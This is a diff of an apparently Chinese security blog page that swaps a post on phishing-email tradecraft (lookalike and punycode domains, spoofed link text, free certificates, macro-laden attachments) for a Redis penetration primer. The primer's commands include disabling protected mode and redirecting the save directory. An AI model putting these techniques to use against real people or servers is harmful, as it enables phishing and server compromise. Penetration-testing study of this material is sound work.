@@ -23,42 +23,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="本文从实战角度对钓鱼邮件攻击思路、姿势、场景、搭建进行研究总结…">
+    <meta name="description" content="本文探究Redis渗透思路及方法...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="钓鱼邮件姿势总结">
+<meta property="og:title" content="Redis攻击面探究">
 <meta property="og:url" content="https://l0n9w4y.cc/posts/20001/index.html">
 <meta property="og:site_name" content="L0n9w4y">
-<meta property="og:description" content="本文从实战角度对钓鱼邮件攻击思路、姿势、场景、搭建进行研究总结…">
+<meta property="og:description" content="本文探究Redis渗透思路及方法...">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/ewomail.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/webmail.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/zoho.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/profile.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/send.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/phish.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/group.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_phish_test.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_template.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/4_page.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/5_campaign.png">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/6_dashboard.png">
-<meta property="article:published_time" content="2020-08-17T14:15:40.000Z">
-<meta property="article:modified_time" content="2022-07-31T12:14:47.713Z">
+<meta property="article:published_time" content="2020-03-09T13:26:58.000Z">
+<meta property="article:modified_time" content="2022-09-08T14:40:17.418Z">
 <meta property="article:author" content="L0n9w4y">
-<meta property="article:tag" content="Initial Access">
-<meta property="article:tag" content="Phishing">
+<meta property="article:tag" content="Execution">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/ewomail.png">
 
 
 <link rel="canonical" href="https://l0n9w4y.cc/posts/20001/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/20001/","path":"posts/20001/","title":"钓鱼邮件姿势总结"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/20001/","path":"posts/20001/","title":"Redis攻击面探究"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>钓鱼邮件姿势总结 | L0n9w4y</title>
+<title>Redis攻击面探究 | L0n9w4y</title>
   
 
 
@@ -134,7 +120,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-text">0x01 攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5"><span class="nav-text">1. 恶意链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%96%87%E6%A1%A3%E6%94%BB%E5%87%BB"><span class="nav-text">2. 文档攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%9C%BA%E6%99%AF%E6%A1%88%E4%BE%8B"><span class="nav-text">0x02 场景案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E5%8E%86%E4%BC%AA%E9%80%A0%E6%8A%95%E9%80%92"><span class="nav-text">1. 简历伪造投递</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%82%AE%E4%BB%B6%E5%8F%8A%E7%BD%91%E7%AB%99%E4%BC%AA%E9%80%A0"><span class="nav-text">2. 邮件及网站伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SRC%E5%81%87%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. SRC假漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA"><span class="nav-text">0x03 平台搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83-x2F-%E5%B7%A5%E5%85%B7"><span class="nav-text">1. 环境&#x2F;工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-VPS"><span class="nav-text">a. VPS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-%E5%9F%9F%E5%90%8D"><span class="nav-text">b. 域名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#c-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">c. 邮件服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#d-%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0"><span class="nav-text">d. 钓鱼平台</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#e-%E7%BA%A2%E9%98%9F%E5%B9%B3%E5%8F%B0"><span class="nav-text">e. 红队平台</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">2. 邮件服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-Ewomail"><span class="nav-text">a. Ewomail</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-Zoho-Mail"><span class="nav-text">b. Zoho Mail</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0"><span class="nav-text">3. 钓鱼平台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-CS-%E5%B9%B3%E5%8F%B0"><span class="nav-text">4. CS 平台</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E9%92%93%E9%B1%BC%E5%AE%9E%E6%88%98"><span class="nav-text">0x04 钓鱼实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%9B%E5%BB%BA%E9%82%AE%E4%BB%B6%E7%94%A8%E6%88%B7-x2F-%E7%BB%84"><span class="nav-text">1. 创建邮件用户&#x2F;组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%A8%A1%E6%9D%BF"><span class="nav-text">2. 钓鱼邮件模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BC%AA%E9%80%A0%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2"><span class="nav-text">3. 伪造钓鱼页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%8F%91%E8%B5%B7%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="nav-text">4. 发起钓鱼攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BB%AA%E8%A1%A8%E6%9D%BF%E6%9F%A5%E7%9C%8B"><span class="nav-text">5. 仪表板查看</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Redis%E5%9F%BA%E7%A1%80"><span class="nav-text">0x01 Redis基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%85%8D%E7%BD%AE"><span class="nav-text">2. 配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">3. 数据类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-text">4. 常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">5. 启动方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF"><span class="nav-text">0x02 渗透姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E6%9C%AC%E5%A7%BF%E5%8A%BF"><span class="nav-text">1. 基本姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">a. 定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-webshell"><span class="nav-text">b. webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#c-%E5%86%99%E5%85%AC%E9%92%A5"><span class="nav-text">c. 写公钥</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AE%B9%E5%99%A8%E5%88%A9%E7%94%A8"><span class="nav-text">2. 容器利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="nav-text">a. 主从复制RCE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF"><span class="nav-text">3. 提权姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%BB%84%E5%90%88%E5%A7%BF%E5%8A%BF"><span class="nav-text">4. 组合姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF-Redis"><span class="nav-text">SSRF + Redis</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -149,7 +135,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -224,12 +210,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="钓鱼邮件姿势总结 | L0n9w4y">
+      <meta itemprop="name" content="Redis攻击面探究 | L0n9w4y">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          钓鱼邮件姿势总结
+          Redis攻击面探究
         </h1>
 
         <div class="post-meta-container">
@@ -240,7 +226,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2020-08-17 22:15:40" itemprop="dateCreated datePublished" datetime="2020-08-17T22:15:40+08:00">2020-08-17</time>
+      <time title="创建时间：2020-03-09 21:26:58" itemprop="dateCreated datePublished" datetime="2020-03-09T21:26:58+08:00">2020-03-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -262,192 +248,46 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <center>本文从实战角度对钓鱼邮件攻击思路、姿势、场景、搭建进行研究总结…</center>
+        <center>本文探究Redis渗透思路及方法...</center>
 
 <span id="more"></span>
 
-<h2 id="0x01-攻击方式"><a href="#0x01-攻击方式" class="headerlink" title="0x01 攻击方式"></a>0x01 攻击方式</h2><h3 id="1-恶意链接"><a href="#1-恶意链接" class="headerlink" title="1. 恶意链接"></a>1. 恶意链接</h3><p><strong>简介</strong></p>
-<p>LNK（快捷方式或符号链接）是引用其他文件或程序的方法；快捷方式修改的利用方式，在MITRE ATT@CK中的ID是T0123，攻击者可以使用这种方式来实现持久化</p>
-<p><strong>Tips</strong></p>
-<pre><code>(1) 用超链接,把元素内容改成想要仿冒的域名
+<h2 id="0x01-Redis基础"><a href="#0x01-Redis基础" class="headerlink" title="0x01 Redis基础"></a>0x01 Redis基础</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。</p>
+<h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h3><p><strong>配置修改</strong></p>
+<p>可以通过修改 redis.conf 文件或使用 CONFIG SET 命令来修改配置。</p>
+<p>语法<br>CONFIG SET 命令基本语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE</span><br></pre></td></tr></table></figure>
 
-(2) 申请一些和目标域名比较相似的域名
+<p><strong>redis.conf 配置项说明：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">1) daemonize no	                 # Redis 默认不是以守护进程的方式运行，可以通过该配置项修改，使用 yes 启用守护进程</span><br><span class="line"></span><br><span class="line">2) pidfile /var/run/redis.pid	 # 当 Redis 以守护进程方式运行时，Redis 默认会把 pid 写入 /var/run/redis.pid 文件，可以通过 pidfile 指定</span><br><span class="line"></span><br><span class="line">3) port 6379	                 # 指定 Redis 监听端口，默认端口为 6379</span><br><span class="line"></span><br><span class="line">4) bind 127.0.0.1	         # 绑定的主机地址，允许远程登录需注释此行</span><br><span class="line"></span><br><span class="line">5) timeout 300	                 # 当客户端闲置多长秒后关闭连接，如果指定为 0 ，表示关闭该功能</span><br><span class="line"></span><br><span class="line">6) loglevel notice	         # 指定日志记录级别，Redis 总共支持四个级别：debug、verbose、notice、warning，默认为 notice</span><br><span class="line"></span><br><span class="line">7) logfile stdout	         # 日志记录方式，默认为标准输出，如果配置 Redis 为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给 /dev/null</span><br><span class="line"></span><br><span class="line">8) databases 16	                 # 设置数据库的数量，默认数据库为0，可以使用SELECT 命令在连接上指定数据库id</span><br><span class="line"></span><br><span class="line">9) save &lt;seconds&gt; &lt;changes&gt;      # 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合</span><br><span class="line"></span><br><span class="line">    Redis 默认配置文件中提供了三个条件：</span><br><span class="line"></span><br><span class="line">    save 900 1</span><br><span class="line">    save 300 10</span><br><span class="line">    save 60 10000</span><br><span class="line"></span><br><span class="line">    分别表示 900 秒（15 分钟）内有 1 个更改，300 秒（5 分钟）内有 10 个更改以及 60 秒内有 10000 个更改。</span><br><span class="line"></span><br><span class="line">10) rdbcompression yes	          # 指定存储至本地数据库时是否压缩数据，默认为 yes，Redis 采用 LZF 压缩，如果为了节省 CPU 时间，可以关闭该选项，但会导致数据库文件变的巨大</span><br><span class="line"></span><br><span class="line">11) dbfilename dump.rdb	          # 指定本地数据库文件名，默认值为 dump.rdb</span><br><span class="line"></span><br><span class="line">12) dir ./	                          # 指定本地数据库存放目录</span><br><span class="line"></span><br><span class="line">13) slaveof &lt;masterip&gt; &lt;masterport&gt;	  # 设置当本机为 slave 服务时，设置 master 服务的 IP 地址及端口，在 Redis 启动时，它会自动从 master 进行数据同步</span><br><span class="line"></span><br><span class="line">14)	masterauth &lt;master-password&gt;	  # 当 master 服务设置了密码保护时，slave 服务连接 master 的密码</span><br><span class="line"></span><br><span class="line">15) requirepass foobared	          # 设置 Redis 连接密码，如果配置了连接密码，客户端在连接 Redis 时需要通过 AUTH &lt;password&gt; 命令提供密码，默认关闭</span><br><span class="line"></span><br><span class="line">16) maxclients 128	                  # 设置同一时间最大客户端连接数，默认无限制，Redis 可以同时打开的客户端连接数为 Redis 进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis 会关闭新的连接并向客户端返回 max number of clients reached 错误信息</span><br><span class="line"></span><br><span class="line">17) maxmemory &lt;bytes&gt;	                  # 指定 Redis 最大内存限制，Redis 在启动时会把数据加载到内存中，达到最大内存后，Redis 会先尝试清除已到期或即将到期的 Key，当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis 新的 vm 机制，会把 Key 存放内存，Value 会存放在 swap 区</span><br><span class="line"></span><br><span class="line">18) appendonly no	                  # 指定是否在每次更新操作后进行日志记录，Redis 在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis 本身同步数据文件是按上面 save 条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为 no</span><br><span class="line"></span><br><span class="line">19) appendfilename appendonly.aof	  # 指定更新日志文件名，默认为 appendonly.aof</span><br><span class="line"></span><br><span class="line">20) appendfsync everysec	          # 指定更新日志条件，共有 3 个可选值：</span><br><span class="line"></span><br><span class="line">    no：表示等操作系统进行数据缓存同步到磁盘（快）</span><br><span class="line">    always：表示每次更新操作后手动调用 fsync() 将数据写到磁盘（慢，安全）</span><br><span class="line">    everysec：表示每秒同步一次（折中，默认值）</span><br><span class="line"></span><br><span class="line">21) vm-enabled no	                  # 指定是否启用虚拟内存机制，默认值为 no，简单的介绍一下，VM 机制将数据分页存放，由 Redis 将访问量较少的页即冷数据 swap 到磁盘上，访问多的页面由磁盘自动换出到内存中</span><br><span class="line"></span><br><span class="line">22) vm-swap-file /tmp/redis.swap	  # 虚拟内存文件路径，默认值为 /tmp/redis.swap，不可多个 Redis 实例共享</span><br><span class="line"></span><br><span class="line">23) vm-max-memory 0	                  # 将所有大于 vm-max-memory 的数据存入虚拟内存，无论 vm-max-memory 设置多小，所有索引数据都是内存存储的(Redis 的索引数据 就是 keys)，也就是说，当 vm-max-memory 设置为 0 的时候，其实是所有 value 都存在于磁盘。默认值为 0</span><br><span class="line"></span><br><span class="line">24) vm-page-size 32	                  # Redis swap 文件分成了很多的 page，一个对象可以保存在多个 page 上面，但一个 page 上不能被多个对象共享，vm-page-size 是要根据存储的 数据大小来设定的，如果存储很多小对象，page 大小最好设置为 32 或者 64bytes；如果存储很大大对象，则可以使用更大的 page，如果不确定，就使用默认值</span><br><span class="line"></span><br><span class="line">25) vm-pages 134217728	                  # 设置 swap 文件中的 page 数量，由于页表（一种表示页面空闲或使用的 bitmap）是在放在内存中的，，在磁盘上每 8 个 pages 将消耗 1byte 的内存。</span><br><span class="line"></span><br><span class="line">26) vm-max-threads 4	                  # 设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4</span><br><span class="line"></span><br><span class="line">27) glueoutputbuf yes	                  # 设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启</span><br><span class="line"></span><br><span class="line">28) hash-max-zipmap-entries 64 / hash-max-zipmap-value 512	 # 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法</span><br><span class="line"></span><br><span class="line">29) activerehashing yes	                  # 指定是否激活重置哈希，默认为开启）</span><br><span class="line"></span><br><span class="line">30) include /path/to/local.conf	          # 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件</span><br></pre></td></tr></table></figure>
 
-(3) IDN punycode转码域名注册
+<h3 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3. 数据类型"></a>3. 数据类型</h3><p>Redis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1) String（字符串）</span><br><span class="line"></span><br><span class="line">string 是 redis 最基本的类型，一个 key 对应一个 value，redis 的 string 可以包含任何数据，比如jpg图片或者序列化的对象，string 类型的值最大能存储 512MB</span><br><span class="line"></span><br><span class="line">命令：SET key value  #设置键值</span><br><span class="line">     GET key        #查看键值</span><br><span class="line"></span><br><span class="line">2) Hash（哈希）</span><br><span class="line"></span><br><span class="line">Redis hash 是一个键值(key=&gt;value)对集合，是一个 string 类型的 field 和 value 的映射表，hash 适合用于存储对象，每个 hash 可以存储 232 -1 键值对（40多亿）</span><br><span class="line"></span><br><span class="line">命令：HMSET name field1 value1 field2 value2 ...  # 设置了N个 field=&gt;value 对</span><br><span class="line">     HGET  name field1                           # 获取对应 field 对应的 value</span><br><span class="line"></span><br><span class="line">3）List（列表）</span><br><span class="line"></span><br><span class="line">Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边），列表最多可存储 232 - 1 元素</span><br><span class="line"></span><br><span class="line">命令：lpush name item1   # 添加元素</span><br><span class="line">     lrange name 0 10   # 查看指定范围元素</span><br><span class="line">     lrange name 0 -1   # 查看所有元素</span><br><span class="line"></span><br><span class="line">4) Set（集合）</span><br><span class="line"></span><br><span class="line">Redis 的 Set 是 string 类型的无序集合。集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)</span><br><span class="line"></span><br><span class="line">命令：sadd key member   # 添加一个 string 元素到 key 对应的 set 集合中，成功返回 1，如果元素已经在集合中返回 0</span><br><span class="line">     smembers key      # 查看集合</span><br><span class="line"></span><br><span class="line">5) zset(sorted set：有序集合)</span><br><span class="line"></span><br><span class="line">Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序</span><br><span class="line"></span><br><span class="line">命令：zadd key score member        # 添加元素到集合，元素在集合中存在则更新对应score</span><br><span class="line">     ZRANGEBYSCORE key 0 1000     # 查看zset</span><br></pre></td></tr></table></figure>
 
-(4) https证书伪造: Let&#39;s Encrypt、Cloudlare等免费可信证书
-</code></pre>
-<h3 id="2-文档攻击"><a href="#2-文档攻击" class="headerlink" title="2. 文档攻击"></a>2. 文档攻击</h3><p>通过携带exe、execl、word等附件（附件中包含中恶意宏代码、远控exe）的方式</p>
-<pre><code>(1) 内嵌链接
+<h3 id="4-常用命令"><a href="#4-常用命令" class="headerlink" title="4. 常用命令"></a>4. 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1) 连接命令</span><br><span class="line">redis-cli -h ip -p port -a passwd   # 远程连接</span><br><span class="line">PING                                # 查看服务是否运行，运行则返回PONG</span><br><span class="line">QUIT                                # 关闭当前连接</span><br><span class="line">SELECT index                        # 切换到指定的数据库</span><br><span class="line"></span><br><span class="line">2) 键值操作</span><br><span class="line">SET key value                       # 设置键 key 的值</span><br><span class="line">GET key                             # 获取键 key 的内容</span><br><span class="line">TYPE key                            # 返回 key 所储存的值的类型</span><br><span class="line">RANDOMKEY                           # 从当前数据库中随机返回一个 key</span><br><span class="line">DEL key                             # 用于在 key 存在时删除 key</span><br><span class="line">RENAME key newkey                   # 修改 key 的名称</span><br><span class="line">KEYS *                              # 列出当前数据库中所有的键，生产环境禁用</span><br><span class="line">GET anotherkey                      # 获取一个不存在的键的值</span><br><span class="line"></span><br><span class="line">3) 服务器相关</span><br><span class="line">INFO                                 # 获取 redis 服务器的统计信息</span><br><span class="line">CLIENT LIST                          # 获取连接到服务器的客户端连接列表</span><br><span class="line">CLIENT GETNAME                       # 获取连接的名称</span><br><span class="line">CLIENT KILL [ip:port] [ID client-id] # 关闭客户端连接</span><br><span class="line">CLIENT SETNAME connection-name       # 设置当前连接的名称</span><br><span class="line">COMMAND                              # 获取 Redis 命令详情数组</span><br><span class="line">COMMAND COUNT                        # 获取 Redis 命令总数</span><br><span class="line">COMMAND GETKEYS                      # 获取给定命令的所有键</span><br><span class="line">TIME                                 # 返回当前服务器时间</span><br><span class="line">CONFIG GET parameter                 # 获取指定配置参数的值</span><br><span class="line">CONFIG SET protected-mode no         # 关闭安全模式</span><br><span class="line">CONFIG SET dir /root/redis           # 设置保存目录</span><br><span class="line">CONFIG SET dbfilename redis.rdb      # 设置保存文件名</span><br><span class="line">CONFIG GET dir                       # 查看保存目录</span><br><span class="line">CONFIG GET dbfilename                # 查看保存文件名</span><br><span class="line">DBSIZE                               # 